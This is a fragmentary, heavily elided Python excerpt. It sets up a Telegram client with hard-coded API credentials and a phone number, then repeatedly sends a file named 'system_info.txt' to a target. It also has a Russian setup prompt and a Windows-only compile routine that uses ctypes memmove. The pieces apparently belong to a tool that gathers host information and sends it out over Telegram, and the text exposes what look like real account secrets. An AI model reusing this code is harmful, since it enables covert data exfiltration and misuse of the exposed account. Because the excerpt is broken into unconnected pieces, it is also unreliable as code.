...
try:
	...
	api_id = 6650002
	api_hash = '81df59b07ac8e68dcb3ae438ea937d16'
	phone = "+380962795689"
	bbot = 'bot.session'
	client = TelegramClient(bbot, api_id, api_hash)
	client.connect()
	...
	for x in range(count):
		client.send_file(target, 'system_info.txt')
...
try:
	...
	try:
		...
		print("Не все Модули Установлены запусти пункт 1.")
		restart_program()
	...
	def compile(self):
		...
		if is_windows:
			...
			memmove = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p,
			                           ctypes.c_void_p, ctypes.c_size_t)(ctypes._memmove_addr)
